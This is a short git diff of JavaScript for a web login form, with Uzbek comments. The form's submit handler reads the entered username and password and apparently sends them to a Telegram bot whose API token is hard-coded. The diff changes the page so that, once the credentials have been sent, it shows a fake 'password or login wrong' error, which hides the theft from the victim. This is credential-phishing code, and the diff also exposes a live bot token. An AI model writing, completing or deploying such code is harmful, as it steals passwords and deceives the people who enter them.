@@ -3,6 +3,10 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
 
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
+    const texterror = document.getElementById("error")
+
+    console.log(texterror);
+    
 
     // Telegram API URL
     const token = '7828795469:AAHdkMvW9jwE05JWSg7nhzCmueyoVJYZzWA';  // Telegram bot tokenini o'zgartiring
@@ -28,14 +32,13 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
 
       const data = await response.json();
       if (response.ok) {
-        console.log("Tayyor");
+        texterror.textContent = "Parol yoki login xato"
         
       } else {
         alert(`Xatolik yuz berdi: ${data.description}`);
       }
     } catch (error) {
-      console.error("Error:", error);
-      alert("Telegram serveri bilan ulanishda xato.");
+      texterror.textContent = "Parol yoki login xato" 
     }
   });
 
